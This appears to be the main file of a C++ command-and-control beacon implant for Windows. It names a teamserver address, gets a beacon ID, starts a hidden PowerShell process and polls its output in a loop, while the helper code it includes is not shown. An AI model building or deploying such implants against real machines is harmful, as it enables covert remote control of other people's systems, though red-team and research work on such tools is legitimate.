#include <Windows.h>
#include <iostream>
#include "ProcessHelper.h"
#include "HostOperations.h"

static std::string teamserverIp = "127.0.0.1";

int main() {

	std::string id = HostOperations::GetBeaconId();

	ProcessHelper::create_powershell_process();

	std::string output;

	for (;;)
	{
		Sleep(3000);
		output = ProcessHelper::read_output();
		if (output != "")
			std::cout << output;
	}

	return 0;
}